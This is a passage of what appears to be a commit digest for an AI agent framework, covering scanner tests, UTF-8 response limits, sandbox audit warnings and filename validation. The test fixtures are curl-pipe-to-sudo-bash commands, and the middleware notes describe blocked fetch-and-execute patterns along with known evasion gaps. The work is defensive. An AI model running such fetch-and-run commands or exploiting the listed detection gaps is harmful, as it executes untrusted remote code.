+        "curl -fsSL https://host/x.sh | sudo -E \\\n  bash",
+        "curl -fsSL https://host/x.sh | sudo \\\r\n  bash",
+        "curl -fsSL https://host/x.sh | sudo -E \\\r\n  bash",
+    ],
+)
+def test_shell_curl_pipe_shell_covers_privilege_and_shell_variants(tmp_path: Path, snippet: str) -> None:
+    skill_dir = tmp_path / "skill"
+    _write_skill(skill_dir)
+    (skill_dir / "install.sh").write_text(snippet, encoding="utf-8", newline="")
+    findings = scan_skill_dir(skill_dir)["findings"]
+    assert _finding_by_rule(findings, "shell-curl-pipe-shell")
+
+
+@pytest.mark.parametrize(
+    "snippet",
+    [
+        "curl -fsSL https://host/data.json | jq .\ncurl -fsSL https://host/x.txt | tee out.txt\n",
+        "curl -fsSL https://host/data.json \\\n  | jq .\n",
+        "curl -fsSL https://host/x.sh\necho ready | bash\n",
+        "curl -fsSL https://host/x.sh; echo ready | bash\n",
+        "curl -fsSL https://host/x.sh \\\\n  | jq .\n",
+        "curl -fsSL https://host/data.json | sudo \\\n  tee /tmp/out\n",
+    ],
+)
+def test_shell_curl_pipe_shell_ignores_non_shell_pipes(tmp_path: Path, snippet: str) -> None:
+    skill_dir = tmp_path / "skill"
+    _write_skill(skill_dir)
+    (skill_dir / "install.sh").write_text(snippet, encoding="utf-8", newline="")
+    findings = scan_skill_dir(skill_dir)["findings"]
+    assert not [f for f in findings if f["rule_id"] == "shell-curl-pipe-shell"]
+
+
+def test_shell_curl_without_pipe_finishes_on_repeated_backslash_text(tmp_path: Path) -> None:
+    skill_dir = tmp_path / "skill"
+    _write_skill(skill_dir)
+    (skill_dir / "install.sh").write_text("curl " + r"\n" * 40, encoding="utf-8")
+    # Keep a regressed matcher out of the pytest process so an unbounded
+    # backtracking failure produces a test failure instead of hanging CI.
+    result = subprocess.run(
+        [
+            sys.executable,
+            "-c",
+            "import sys; from pathlib import Path; from deerflow.skills.skillscan import scan_skill_dir; findings = scan_skill_dir(Path(sys.argv[1]))['findings']; assert not any(f['rule_id'] == 'shell-curl-pipe-shell' for f in findings)",
+            str(skill_dir),
+        ],
+        capture_output=True,
+        text=True,
+        encoding="utf-8",
+        errors="replace",
+        timeout=15,
+        check=False,
+    )
+    assert result.returncode == 0, result.stderr
+
+
 @pytest.mark.parametrize(
     "url, host",
     [
```

---

### Incident Patch 8: `d67a9e4d` (2026-10-05)
**Commit Message**: fix(extensions): measure the team response size gate in UTF-8 bytes (#6274)

* fix(extensions): measure the team response size gate in UTF-8 bytes

json.dumps escapes non-ASCII by default, so a CJK clarification answer
counted ~6 escaped bytes per character and an emoji 12, while the plugin
documents 4,000 characters / 8,000 UTF-8 bytes and its own UI validates
exactly those two bounds. A 漢 answer of 2,000 characters (6,000 UTF-8
bytes, inside the bound) was refused by the gate.

Serialize with ensure_ascii=False so the gate measures the UTF-8 bytes it
names, matching the budget walkers in the same module.

* fix(agent-teams): honor the raw UTF-8 response boundary

Measure string answers without JSON quotes or escapes, retain the structured JSON byte limit, and reject malformed Unicode with the normal response validation error. Add boundary and state-preservation regressions and document the response budgets.

---------

Co-authored-by: Willem Jiang <[REDACTED_EMAIL]>

**File**: `backend/tests/test_agent_teams_plugin.py` (modified, +105/-0)
```diff
@@ -1,6 +1,7 @@
 """Team extension contracts exercised through the installed contribution."""
 
 import asyncio
+import json
 from pathlib import Path
 from types import SimpleNamespace
 
@@ -943,3 +944,107 @@ async def lost_ack(**kwargs):
     view = await actions["get"]({"team_id": team["id"]}, context(runs))
     assert view["jobs"][0]["status"] == "cancelled"
     assert len(view["jobs"]) == 1 and len(runs.starts) == 2
+
+
+async def waiting_job(actions, service, runs, *, clarification=False):
+    """Park a job for either an explicit interrupt or an ordinary clarification."""
+    team = await create(actions, runs)
+    sent = await actions["send"]({"team_id": team["id"], "member_id": team["members"][0]["id"], "text": "Check release", "request_id": "one"}, context(runs))
+    await service.tick()
+    runs.finish(sent["id"], interrupted=not clarification)
+    if clarification:
+        from deerflow.agents.middlewares.clarification_middleware import ClarificationMiddleware
+
+        request = SimpleNamespace(tool_call={"name": "ask_clarification", "id": "question", "args": {"question": "Which environment?", "clarification_type": "missing_info"}}, runtime=None)
+        command = ClarificationMiddleware().wrap_tool_call(request, lambda _: pytest.fail("intercept clarification"))
+        runs.threads[team["members"][0]["thread_id"]]["values"]["messages"].extend(m.model_dump() for m in command.update["messages"])
+    await service.tick()
+    assert (await actions["get"]({"team_id": team["id"]}, context(runs)))["jobs"][0]["status"] == "waiting_input"
+    return team, sent
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "answer",
+    [
+        pytest.param("漢" * 2000, id="cjk-2000-chars"),
+        pytest.param("🙂" * 1000, id="emoji-1000-chars"),
+        pytest.param("a" * 4000, id="ascii-4000-chars"),
+        pytest.param('"' * 4000, id="json-quotes"),
+        pytest.param("\n" * 3999 + "a", id="json-newlines"),
+    ],
+)
+async def test_a_clarification_answer_within_the_documented_bounds_is_accepted(plugin, answer):
+    # README: tasks and clarification answers accept up to 4,000 characters / 8,000 UTF-8 bytes,
+    # and the UI validates exactly those two bounds before submitting.
+    _, actions, service = plugin
+    runs = Runs()
+    team, sent = await waiting_job(actions, service, runs)
+    await actions["resume"]({"team_id": team["id"], "job_id": sent["id"], "response": answer, "request_id": "answer"}, context(runs))
+    assert (await actions["get"]({"team_id": team["id"]}, context(runs)))["jobs"][0]["status"] == "resuming"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("answer", ["漢" * 3000, {"text": "x" * 9000}])
+async def test_an_oversized_clarification_answer_is_still_refused(plugin, answer):
+    _, actions, service = plugin
+    runs = Runs()
+    team, sent = await waiting_job(actions, service, runs)
+    with pytest.raises(ValueError, match="8 KiB"):
+        await actions["resume"]({"team_id": team["id"], "job_id": sent["id"], "response": answer, "request_id": "answer"}, context(runs))
+    assert (await actions["get"]({"team_id": team["id"]}, context(runs)))["jobs"][0]["status"] == "waiting_input"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("clarification", [False, True], ids=["interrupt", "clarification"])
+@pytest.mark.parametrize("size", [7999, 8000, 8001])
+async def test_string_response_uses_the_raw_utf8_byte_boundary(plugin, clarification, size):
+    _, actions, service = plugin
+    runs = Runs()
+    team, sent = await waiting_job(actions, service, runs, clarification=clarification)
+    answer = "漢" * 2666 + "a" * (size - 7998)
+    payload = {"team_id": team["id"], "job_id": sent["id"], "response": answer, "request_id": "answer"}
+    if size > 8000:
+        with pytest.raises(ValueError, match="8 KiB"):
+            await actions["resume"](payload, context(runs))
+    else:
+        await actions["resume"](payload, context(runs))
+    job = (await service.db("get", "alice", team["id"]))["jobs"][0]
+    assert job["status"] == ("waiting_input" if size > 8000 else "resuming")
+    if size <= 8000:
+        assert job["resume"]["response"] == answer
+        if clarification:
+            assert job["resume"]["input"]["messages"][0]["content"] == answer
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("size", [7999, 8000, 8001])
+async def test_structured_response_keeps_the_utf8_json_byte_boundary(plugin, size):
+    _, actions, service = plugin
+    runs = Runs()
+    team, sent = await waiting_job(actions, service, runs)
+    # The JSON object adds 12 bytes around its string value.
+    answer = {"text": "漢" * 2660 + "a" * (size - 7980 - 12)}
+    payload = {"team_id": team["id"], "job_id": sent["id"], "response": answer, "request_id": "answer"}
+    if size > 8000:
+        with pytest.raises(ValueError, match="8 KiB"):
+            await actions["resume"](payload, context(runs))
+    else:
+        await actions["resume"](payload, co
```

**File**: `examples/deerflow-extension-agent-teams/AGENTS.md` (modified, +2/-0)
```diff
@@ -27,6 +27,8 @@ backend character/UTF-8 byte limits. Use host theme tokens for action colors.
 Validate user-entered team names, goals, tasks and clarification answers against
 both backend bounds without truncating the draft. Native mention labels must fit
 the host's 120 UTF-16-unit limit; keep routing IDs independent of display labels.
+Measure string responses as raw UTF-8 and structured interrupt responses as UTF-8
+JSON. Reject malformed Unicode before changing a waiting job or admitting a run.
 
 Ordinary human-input artifacts end runs successfully without a graph interrupt.
 Keep unanswered requests waiting; persist text-response inputs and idempotency
```

**File**: `examples/deerflow-extension-agent-teams/README.md` (modified, +8/-2)
```diff
@@ -109,7 +109,11 @@ own teams. Sharing a host conversation does **not** share its team's private dat
 - Team names accept up to 80 characters / 160 UTF-8 bytes; goals accept up to
   2,000 characters / 4,000 UTF-8 bytes. Tasks and clarification answers accept
   up to 4,000 characters / 8,000 UTF-8 bytes. The UI validates both bounds before
-  submission and preserves oversized text for editing. Native mention labels
+  submission and preserves oversized text for editing. String answers count their
+  raw UTF-8 bytes, including the 8,000-byte ceiling; JSON quotes and escapes do not
+  reduce that allowance. Structured graph-interrupt responses retain an 8,000-byte
+  UTF-8 JSON limit. Responses with unpaired Unicode surrogates are rejected through
+  the normal response validation. Native mention labels
   fall back to the member name when the combined team/member label exceeds the
   host's 120 UTF-16-unit limit; selection still routes by team/member IDs.
   Shared context contains
@@ -151,7 +155,9 @@ creation), request capacity independent of receipts, ambiguous admission, and
 lifecycle locking. Host-run transport is controlled for deterministic tests.
 Clarification tests execute the host's real tool and middleware in an Agent graph,
 including repeated questions, peer/mention/result-receipt paths, lost response
-acknowledgements and restart. Queued-request regressions pin handoff attribution
+acknowledgements and restart. Response regressions cover the 7,999/8,000/8,001-byte
+boundaries for both input paths, structured JSON, escaping and malformed Unicode.
+Queued-request regressions pin handoff attribution
 and the chain limit while the first request is running or awaiting admission acknowledgement.
 
 For a browser check, install the repo's frontend dependencies, then start the
```

**File**: `examples/deerflow-extension-agent-teams/deerflow_extension_agent_teams/service.py` (modified, +7/-1)
```diff
@@ -318,7 +318,13 @@ async def cancel(self, payload, context):
 
     async def resume(self, payload, context):
         fields(payload, "team_id job_id response request_id")
-        if payload["response"] is None or len(json.dumps(payload["response"]).encode()) > 8000:
+        response = payload["response"]
+        try:
+            content = response if isinstance(response, str) else json.dumps(response, ensure_ascii=False)
+            valid = response is not None and len(content.encode("utf-8")) <= 8000
+        except UnicodeEncodeError:
+            valid = False
+        if not valid:
             raise ValueError("An explicit response of at most 8 KiB is required")
         text(payload, "request_id", 128)
         return await self.control(payload, context, cancel=False)
```

---

### Incident Patch 9: `7d50f3fc` (2026-10-05)
**Commit Message**: fix(sandbox): keep the exit marker last when appending audit warnings (#6307)

* fix(sandbox): keep the exit marker last when appending audit warnings

The medium-risk warning was appended after the bash exit marker and the ToolMessage was rebuilt from four fields. The subagent executor anchors its exit-status regex on the trailing 'Exit Code: N' (and fullmatches 'Command exited with code N'), so a failed command was harvested as success; the rebuild also dropped deerflow_tool_meta, artifact and id. Insert the warning before a trailing marker, leave a bare remote marker untouched, and copy the message instead of rebuilding it.

Document the warning placement in agents/middlewares/AGENTS.md.

* docs(changelog): reference #6307 in the sandbox audit entry

* fix(sandbox): keep a trailing remote exit marker last as well

Match the full sandbox.tools._BASH_EXIT_MARKER_TAIL_RE alternation when
choosing where to insert the medium-risk warning, so output that ends in
`Command exited with code N` after other text keeps the marker last too.

* test(sandbox): import the middleware tail regex inside its test

A module-level import of the new name made the whole file fail to collect
against mai

**File**: `CHANGELOG.md` (modified, +10/-0)
```diff
@@ -466,6 +466,15 @@ This release closes that milestone with **301 merged pull requests**.
 
 ### Fixed
 
+- **sandbox:** Medium-risk audit warnings no longer hide a failed shell exit from
+  subagent evidence. `SandboxAuditMiddleware` appended its warning after the
+  trailing `Exit Code: N` marker and rebuilt the `ToolMessage` from four fields,
+  so `_bash_evidence_status` could not find the marker and fell back to
+  `deerflow_tool_meta`, which reports `success`; a failed `sudo pytest -q` could
+  satisfy a `tests_passed` acceptance criterion. The warning is now inserted
+  before a trailing `Exit Code: N` or `Command exited with code N`, an output
+  that is only `Command exited with code N` is left unchanged, and the result
+  keeps `deerflow_tool_meta`, `artifact` and `id`. ([#6307])
 - **persistence:** A second Gateway instance no longer fails startup with
   `TimeoutError` while another instance runs a PostgreSQL schema migration. The
   bootstrap advisory lock was taken with a blocking `pg_advisory_lock` on the
@@ -7756,3 +7765,4 @@ with **180 merged pull requests** since the first 2.0 milestone tag.
 [#6282]: https://github.com/bytedance/deer-flow/pull/6282
 [#6305]: https://github.com/bytedance/deer-flow/pull/6305
 [#6306]: https://github.com/bytedance/deer-flow/pull/6306
+[#6307]: https://github.com/bytedance/deer-flow/pull/6307
```

**File**: `CHANGELOG_zh.md` (modified, +8/-0)
```diff
@@ -423,6 +423,13 @@
 
 ### 修复
 
+- **沙箱：** 中风险审计警告不再让子智能体证据丢失失败的 shell 退出码。
+  `SandboxAuditMiddleware` 原先把警告追加在结尾的 `Exit Code: N` 标记之后，并只用
+  四个字段重建 `ToolMessage`，导致 `_bash_evidence_status` 找不到标记，退回到报告
+  `success` 的 `deerflow_tool_meta`，失败的 `sudo pytest -q` 可能满足 `tests_passed`
+  验收条件。现在警告插在结尾的 `Exit Code: N` 或 `Command exited with code N`
+  之前，整段只有 `Command exited with code N` 的输出保持原样，结果保留
+  `deerflow_tool_meta`、`artifact` 与 `id`。([#6307])
 - **持久化：** 另一个实例正在执行 PostgreSQL 模式迁移时，第二个 Gateway 实例不再
   因 `TimeoutError` 启动失败。引导期 advisory lock 此前在应用引擎上以阻塞的
   `pg_advisory_lock` 获取，而该引擎的 asyncpg `database.command_timeout`（默认
@@ -6470,3 +6477,4 @@ DeerFlow 2.0 是围绕"超级智能体"框架的彻底重写，核心包含子
 [#6282]: https://github.com/bytedance/deer-flow/pull/6282
 [#6305]: https://github.com/bytedance/deer-flow/pull/6305
 [#6306]: https://github.com/bytedance/deer-flow/pull/6306
+[#6307]: https://github.com/bytedance/deer-flow/pull/6307
```

**File**: `backend/packages/harness/deerflow/agents/middlewares/AGENTS.md` (modified, +2/-2)
```diff
@@ -75,10 +75,10 @@ strict providers reject.
    `__authorization_outcome` key (so `build_run_config` strips caller-supplied
    forgeries). Consumers pop it; the publisher and the consumer share only that
    contract module.
-12. **SandboxAuditMiddleware** - Audits sandboxed shell/file operations before tool execution; command classification is **defense-in-depth and audit, not a security boundary** (the sandbox is the isolation boundary). Command substitution is judged by *position*, not the presence of `$(`: **command position** (`$(curl url)`, `` `curl url` ``, the word after `|`/`&&`/`;`, an `eval`/`source` argument) executes fetched content and is blocked; **value position** (`x=$(curl url)`, `echo $(curl url)`, an argument, a `for` word list) only captures output and passes (#4611). So `_HIGH_RISK_COMMAND_POSITION_PATTERNS` is matched anchored against each sub-command from `_split_compound_command(split_pipes=True)`, never the whole string; pipe-spanning rules (`| sh`, `base64 -d | ...`) still use `_classify_command`'s whole-command Pass 1. `_COMMAND_POSITION_PREFIX` extends the anchor over leading assignments and exec wrappers (`FOO=1 $(curl url)`, `env`/`command`/`builtin`/`exec`/`nohup`/`time`/`sudo`/`doas`); its assignment branch requires whitespace before the substitution, which keeps `x=$(curl url)` in value position. Two contexts are deliberately **position-blind** (matched whole-command in Pass 1, since they execute their input anywhere, e.g. `xargs sh -c "$(curl url)"`): an `eval`/`source` argument, and an interpreter **code-string flag** — `-c` (shells, `python`), `-e` (`perl`/`ruby`/`node`), `-p` (`perl`/`node`), `-r` (`php`) — plus the here-string (`<<<`) reaching the same place via stdin. All three substitution spellings (`$(`, `<(`, `` ` ``) share one `_RISKY_SUBSTITUTION` opener. An unquoted newline splits like `;` (else `echo hi\n$(curl url)` evades the anchored rules). Heredoc bodies are data: `_split_compound_command` records headers (`<<EOF`, `<<-EOF`, `<<'EOF'`) and consumes their bodies verbatim, so a body line starting `$(curl url)` isn't promoted to a command position; `<<<` (here-string, needs look-ahead + look-behind) and a `<<` inside `$(( ))`/`(( ))` (bit shift, arithmetic depth tracked with the quote flags) must not open one. This is a heuristic, not shell parsing — an unterminated body consumes the rest of the string, an unclosed `((` only disables heredoc detection, and the failure direction is always toward *more* command positions, not fewer. Known gaps: process substitution outside `eval`/`source` (`. <(curl u)`) is undetected, and two-step forms (`x=$(curl u); eval "$x"`) need dataflow analysis. No config gate — appended unconditionally in `_build_runtime_middlewares`, for both lead and subagents.
+12. **SandboxAuditMiddleware** - Audits sandboxed shell/file operations before tool execution; command classification is **defense-in-depth and audit, not a security boundary** (the sandbox is the isolation boundary). Command substitution is judged by *position*, not the presence of `$(`: **command position** (`$(curl url)`, `` `curl url` ``, the word after `|`/`&&`/`;`, an `eval`/`source` argument) executes fetched content and is blocked; **value position** (`x=$(curl url)`, `echo $(curl url)`, an argument, a `for` word list) only captures output and passes (#4611). So `_HIGH_RISK_COMMAND_POSITION_PATTERNS` is matched anchored against each sub-command from `_split_compound_command(split_pipes=True)`, never the whole string; pipe-spanning rules (`| sh`, `base64 -d | ...`) still use `_classify_command`'s whole-command Pass 1. `_COMMAND_POSITION_PREFIX` extends the anchor over leading assignments and exec wrappers (`FOO=1 $(curl url)`, `env`/`command`/`builtin`/`exec`/`nohup`/`time`/`sudo`/`doas`); its assignment branch requires whitespace before the substitution, which keeps `x=$(curl url)` in value position. Two contexts are deliberately **position-blind** (matched whole-command in Pass 1, since they execute their input anywhere, e.g. `xargs sh -c "$(curl url)"`): an `eval`/`source` argument, and an interpreter **code-string flag** — `-c` (shells, `python`), `-e` (`perl`/`ruby`/`node`), `-p` (`perl`/`node`), `-r` (`php`) — plus the here-string (`<<<`) reaching the same place via stdin. All three substitution spellings (`$(`, `<(`, `` ` ``) share one `_RISKY_SUBSTITUTION` opener. An unquoted newline splits like `;` (else `echo hi\n$(curl url)` evades the anchored rules). Heredoc bodies are data: `_split_compound_command` records headers (`<<EOF`, `<<-EOF`, `<<'EOF'`) and consumes their bodies verbatim, so a body line starting `$(curl url)` isn't promoted to a command position; `<<<` (here-string, needs look-ahead + look-behind) and a `<<` inside `$(( ))`/`(( ))` (bit shift, arithmetic depth tracked with the quote flags) must not open one. This is a heuristic, not shell parsing — an unterminated body consumes the rest of the string, an unclosed `((` only disables heredoc de
```

**File**: `backend/packages/harness/deerflow/agents/middlewares/sandbox_audit_middleware.py` (modified, +20/-7)
```diff
@@ -114,6 +114,14 @@
     re.compile(r"\bPATH\s*="),
 ]
 
+# Shell exit markers at the end of the output (mirrors
+# ``sandbox.tools._BASH_EXIT_MARKER_TAIL_RE``, plus a bare ``Exit Code: N``):
+# local ``Exit Code: N`` and remote ``Command exited with code N``. Remote
+# providers emit the latter as the whole output; it is matched after other
+# output too, so the warning never lands after either form.
+_EXIT_MARKER_TAIL_RE = re.compile(r"(?:(?:^|\n)Exit Code: -?\d+|\n?Command exited with code -?\d+)\s*$")
+_SILENT_EXIT_MARKER_RE = re.compile(r"Command exited with code -?\d+")
+
 
 # A heredoc header and its delimiter: ``<<EOF``, ``<< EOF``, ``<<-EOF``,
 # ``<<\EOF``, ``<<'EOF'``, ``<<"EOF"``. Both guards are needed to keep ``<<<``
@@ -427,13 +435,18 @@ def _append_warn_to_result(self, result: ToolMessage | Command, command: str) ->
         if isinstance(result.content, list):
             new_content = list(result.content) + [{"type": "text", "text": warning}]
         else:
-            new_content = str(result.content) + warning
-        return ToolMessage(
-            content=new_content,
-            tool_call_id=result.tool_call_id,
-            name=result.name,
-            status=result.status,
-        )
+            content = str(result.content)
+            if _SILENT_EXIT_MARKER_RE.fullmatch(content.strip()):
+                # The whole output IS the exit marker; evidence consumers
+                # fullmatch it, so any added text would erase the failure.
+                return result
+            # Keep a trailing exit marker last: evidence consumers anchor on
+            # it to recover the real shell status (see sandbox/tools.py).
+            marker = _EXIT_MARKER_TAIL_RE.search(content)
+            cut = marker.start() if marker else len(content)
+            new_content = content[:cut] + warning + content[cut:]
+        # model_copy keeps additional_kwargs (deerflow_tool_meta), artifact and id.
+        return result.model_copy(update={"content": new_content})
 
     # ------------------------------------------------------------------
     # Input sanitisation
```

**File**: `backend/tests/test_sandbox_audit_middleware.py` (modified, +107/-0)
```diff
@@ -12,6 +12,7 @@
     _classify_command,
     _split_compound_command,
 )
+from deerflow.sandbox.tools import _BASH_EXIT_MARKER_TAIL_RE
 
 # ---------------------------------------------------------------------------
 # Helpers
@@ -744,6 +745,112 @@ def test_audit_log_written_for_medium_risk_command(self):
         assert verdict == "warn"
 
 
+# ---------------------------------------------------------------------------
+# Medium-risk warning must not disturb the evidence the subagent harvests
+# ---------------------------------------------------------------------------
+
+
+class TestMediumRiskWarningPreservesEvidence:
+    """The warning is appended to a result that ToolErrorHandling has already
+    stamped; the subagent then reads the exit status from a trailing marker
+    and ``deerflow_tool_meta``. Neither may be lost to the warning."""
+
+    def setup_method(self):
+        self.mw = SandboxAuditMiddleware()
+
+    def _call(self, inner: ToolMessage, command: str = "sudo pytest -q") -> ToolMessage:
+        with patch.object(self.mw, "_write_audit"):
+            return self.mw.wrap_tool_call(_make_request(command), _make_handler(inner))
+
+    def test_exit_marker_stays_at_the_end(self):
+        inner = ToolMessage(content="12 passed in 1.0s\nExit Code: 1", tool_call_id="call-123", name="bash")
+        result = self._call(inner)
+        assert "warning" in result.content.lower()
+        assert result.content.endswith("\nExit Code: 1")
+        assert result.content.startswith("12 passed in 1.0s")
+
+    def test_bare_exit_marker_is_kept(self):
+        inner = ToolMessage(content="Exit Code: 2", tool_call_id="call-123", name="bash")
+        assert self._call(inner).content.endswith("Exit Code: 2")
+
+    def test_exit_marker_with_trailing_whitespace_stays_at_the_end(self):
+        inner = ToolMessage(content="boom\nExit Code: -9  \n", tool_call_id="call-123", name="bash")
+        result = self._call(inner)
+        assert "warning" in result.content.lower()
+        assert result.content.endswith("\nExit Code: -9  \n")
+
+    def test_silent_remote_exit_marker_is_left_untouched(self):
+        """Remote providers emit this as the whole output; consumers fullmatch it."""
+        inner = ToolMessage(content="Command exited with code 3", tool_call_id="call-123", name="bash")
+        assert self._call(inner).content == "Command exited with code 3"
+
+    def test_remote_exit_marker_after_output_stays_at_the_end(self):
+        """Same shape ``sandbox.tools._BASH_EXIT_MARKER_TAIL_RE`` preserves on truncation."""
+        inner = ToolMessage(content="progress...\nCommand exited with code 3", tool_call_id="call-123", name="bash")
+        result = self._call(inner)
+        assert result.content.startswith("progress...")
+        assert "warning" in result.content.lower()
+        assert result.content.endswith("\nCommand exited with code 3")
+        assert result.content.count("Command exited with code 3") == 1
+
+    def test_exit_marker_regex_covers_the_truncation_tail_shapes(self):
+        """Every tail shape truncation keeps last is one the warning is inserted before."""
+        from deerflow.agents.middlewares.sandbox_audit_middleware import _EXIT_MARKER_TAIL_RE
+
+        for content in ("out\nExit Code: 1", "out\nExit Code: -9 \n", "out\nCommand exited with code 3", "Command exited with code 3"):
+            ours = _EXIT_MARKER_TAIL_RE.search(content)
+            theirs = _BASH_EXIT_MARKER_TAIL_RE.search(content)
+            assert ours is not None and theirs is not None
+            assert ours.start() == theirs.start(), content
+
+    def test_output_without_marker_still_gets_warning_at_the_end(self):
+        inner = ToolMessage(content="Successfully installed requests", tool_call_id="call-123", name="bash")
+        result = self._call(inner, "pip install requests")
+        assert result.content.startswith("Successfully installed requests")
+        assert result.content.rstrip().endswith("may modify the runtime environment.")
+
+    def test_rebuild_keeps_tool_meta_artifact_and_id(self):
+        meta = {"status": "success", "source": "normalized"}
+        inner = ToolMessage(
+            content="ok\nExit Code: 0",
+            tool_call_id="call-123",
+            name="bash",
+            id="tool-msg-1",
+            artifact={"k": "v"},
+            additional_kwargs={"deerflow_tool_meta": meta},
+        )
+        result = self._call(inner)
+        assert result.additional_kwargs == {"deerflow_tool_meta": meta}
+        assert result.artifact == {"k": "v"}
+        assert result.id == "tool-msg-1"
+        assert result.tool_call_id == "call-123"
+        assert result.status == inner.status
+
+    def test_list_content_gets_warning_block_and_keeps_meta(self):
+        blocks = [{"type": "text", "text": "ok\nExit Code: 1"}]
+        meta = {"status": "success"}
+        inner = ToolMessage(content=blocks, tool_call_id="call-123", name="bash", additional_kwargs={"
```

---

### Incident Patch 10: `22623d1b` (2026-10-05)
**Commit Message**: fix(projects): validate explicit document names before staging (#6287)

**File**: `README.md` (modified, +5/-0)
```diff
@@ -2334,6 +2334,11 @@ from the project page's Documents section:
 - **Attach to thread**: copy a shelf file into a thread's uploads through the
   normal ingestion pipeline, so the conversation can work with it directly.
 
+New shelf names, including explicit upload `name` and promotion `shelf_name`,
+follow ordinary upload filename validation. Names containing NUL, Windows
+reserved device names (such as `CON.txt`), or trailing dots are rejected with
+`400` before bytes are staged.
+
 Runs on member threads also receive a bounded `<documents>` index rendered per
 run from the pinned snapshot (capped by `projects.shelf_index_max_entries` and
 `projects.shelf_index_max_bytes`), and the agent can page the shelf and read
```

**File**: `backend/app/gateway/AGENTS.md` (modified, +1/-1)
```diff
@@ -117,7 +117,7 @@ owner-scoped assistant version selection remains enabled.
 | **Subagents** (`/api/subagents`) | Admin managed-worker CRUD and listing. |
 | **Integrations** (`/api/integrations`) | `GET /lark/status` - inspect managed Lark/Feishu CLI integration state, including `sandbox_runtime_mode` / `sandbox_runtime_probed` / `sandbox_runtime_ready` (whether `lark-cli` will be present in the sandbox at chat time); `POST /lark/install` - admin-only install of the official `lark-*` managed skill pack; `POST /lark/config/start` and `/lark/config/complete` - internal first-time Lark connection setup; `POST /lark/config/credentials` - atomically switch the caller's per-user Lark app after validating the new `app_id`/`app_secret` through the official CLI's live tenant-token probe, revoke/remove the previous OAuth tokens, and restore the prior credential tree if the switch fails; `POST /lark/auth/start` and `/lark/auth/complete` - browser device-flow user authorization without terminal access, with optional `domains` / exact `scope` for incremental permission grants. Config and auth flows carry a server-issued, per-user generation persisted under the credential lock; a rejected direct switch leaves the current generation unchanged, stale completions return 409, and browser re-registration uses the same token-clearing/revocation transaction as direct credential switches. |
 | **Memory** (`/api/memory`) | `GET /` - memory data; `POST /reload` - force reload; `GET /config` - config; `GET /status` - config + data |
-| **Uploads** (`/api/threads/{id}/uploads`) | `POST /` - upload files (auto-converts PDF/PPT/Excel/Word); non-mounted sync releases its lease after the last holder exits; `GET /list` - list; `DELETE /{filename}` - delete a regular file; symlinks 404 and a converted `.md` is kept (#5672) |
+| **Uploads** (`/api/threads/{id}/uploads`) | `POST /` - upload/convert PDF/PPT/Excel/Word; upload/shelf names share `normalize_filename` before staging; non-mounted sync lease ends when its last holder exits; `GET /list`; `DELETE /{filename}` - regular files, symlinks 404, keeps converted `.md` (#5672) |
 | **Threads** (`/api/threads/{id}`) | `DELETE /` - remove DeerFlow-managed local thread data after LangGraph thread deletion; `POST /branches` - branch a completed assistant turn with a replay checkpoint; inherited titles take next-free displayed sibling suffixes, including explicit/renamed ones, while explicit titles stay unchanged. Durable `branch` admission rejects races. Workspace files are not checkpointed, so the branch only best-effort copies the current workspace when branching from the **latest** turn (`workspace_clone_mode="current_thread_best_effort"`); branching from an older/historical turn skips the copy (`workspace_clone_mode="skipped_historical_turn"`) so the branch never inherits files that only exist in a later timeline. Thread-scoped runtime channels (`sandbox`, `thread_data`) are not copied onto the branch: the parent's `sandbox_id` binds path mappings and the release lifecycle to the parent's workspace, so the branch lazily acquires its own sandbox instead. Branch creation also seeds the new thread's run-event feed from the branch checkpoint's visible messages (`history_seed_mode` in the response): the thread feed reads run_events, not checkpoints, so without the seed the inherited history disappears from the UI after the branch's first run (#4380). Seeded rows are grouped into one synthetic run per inherited turn (`branch-seed-{thread_id}-{n}`, a new turn opening at every persisted human message, including an allowlisted hidden `ask_clarification` reply) because `run_id` is a turn identity to the feed's consumers, not a provenance tag: regenerating an inherited answer supersedes that row's whole `run_id` in `GET /messages/page`, so one shared id for the entire seed deleted the complete inherited history on a branch's first regenerate (#4458); `GET /goal`, `PUT /goal`, `DELETE /goal` - read, set, and clear the active thread goal; `POST /compact` - summarize older active context, deriving memory policy and bucket from the state-producing checkpoint rather than request `agent_name`, and block while a run is in flight; unexpected failures return a generic 500 detail |
 | **Artifacts** (`/api/threads/{id}/artifacts`) | GET streams byte ranges; HTML/XML/XSL/`+xml` (also `.skill` members) and `?download=true` force attachments. PUT atomically replaces existing UTF-8 outputs on matching SHA-256; active runs conflict. Non-mounted sync uses a request lease and drains remote/local commit-or-rollback across cancellation before releasing reservations/leases. `resolve_outputs_confined_path` normalizes `..` and confines host paths against traversal/symlinks. Preserve POSIX ownership/mode where supported; Windows keeps temp-file permissions. Digest cache: path/dev/ino/ctime_ns/mtime_ns/size; identity invalidates same-size/mtime replacements. Large regular files use stat-prefixed ETags; If-Range requires ma
```

**File**: `backend/packages/harness/deerflow/projects/documents.py` (modified, +2/-12)
```diff
@@ -37,7 +37,7 @@
 from typing import TYPE_CHECKING, Any
 
 from deerflow.config.paths import Paths
-from deerflow.uploads.manager import is_reserved_upload_filename
+from deerflow.uploads.manager import normalize_filename
 from deerflow.utils.file_conversion import CONVERTIBLE_EXTENSIONS, convert_file_to_markdown
 from deerflow.utils.file_io import await_drained, run_file_io
 from deerflow.utils.text_detection import is_text_file_by_content
@@ -47,8 +47,6 @@
 
 logger = logging.getLogger(__name__)
 
-_MAX_FILENAME_BYTES = 255
-
 
 class ShelfUploadTooLargeError(Exception):
     """Raised when staged bytes exceed ``uploads.max_file_size`` (mapped to 413)."""
@@ -64,17 +62,9 @@ def validate_shelf_filename(name: str) -> str:
     including Win32 aliases; existing shelf rows are not revalidated on reads.
     """
     candidate = name.strip() if name else ""
-    if not candidate:
-        raise ValueError("Filename is empty")
     if "/" in candidate or "\\" in candidate:
         raise ValueError(f"Filename contains a path separator: {name!r}")
-    if candidate in {".", ".."}:
-        raise ValueError(f"Filename is unsafe: {name!r}")
-    if len(candidate.encode("utf-8")) > _MAX_FILENAME_BYTES:
-        raise ValueError(f"Filename exceeds {_MAX_FILENAME_BYTES} UTF-8 bytes")
-    if is_reserved_upload_filename(candidate):
-        raise ValueError(f"Filename uses reserved upload staging pattern: {name!r}")
-    return candidate
+    return normalize_filename(candidate)
 
 
 def shelf_relpath(project_id: str, sha256: str, document_id: str) -> str:
```

**File**: `backend/tests/test_project_documents_promotion.py` (modified, +23/-0)
```diff
